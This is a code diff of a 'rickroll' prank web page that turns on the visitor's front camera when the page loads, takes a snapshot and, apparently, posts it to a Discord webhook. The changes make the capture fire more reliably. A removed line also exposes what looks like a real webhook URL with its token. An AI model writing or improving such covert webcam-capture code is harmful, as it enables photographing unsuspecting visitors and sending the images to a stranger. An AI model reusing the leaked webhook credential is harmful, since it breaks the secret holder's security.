@@ -13,7 +13,7 @@
             transform: translate(-50%, -50%);
             width: 300px;  /* Set the desired width */
             height: 300px; /* Set the desired height */
-            background-image: url('rickroll.png');
+            background-image: url('rickroll.png'); /* Make sure this image is hosted or available */
             background-size: contain; /* Adjust to fit within width and height */
             background-repeat: no-repeat;
             background-position: center;
@@ -42,7 +42,7 @@
     <img id="snapshot" style="display: none;"/>
 
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"; // Replace with your webhook URL
 
         // Start the camera automatically when the page loads
         window.onload = async () => {
@@ -59,11 +59,16 @@
 
             try {
                 const video = document.getElementById('video');
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
                 video.srcObject = stream;
 
-                // Capture snapshot after a short delay
-                setTimeout(() => takeSnapshot(stream), 2000;
+                // Capture snapshot once metadata is loaded
+                video.addEventListener('loadedmetadata', () => {
+                    takeSnapshot(stream);
+                });
+
             } catch (error) {
                 console.error('Error accessing the camera:', error);
                 alert('Error accessing the camera: ' + error.message);
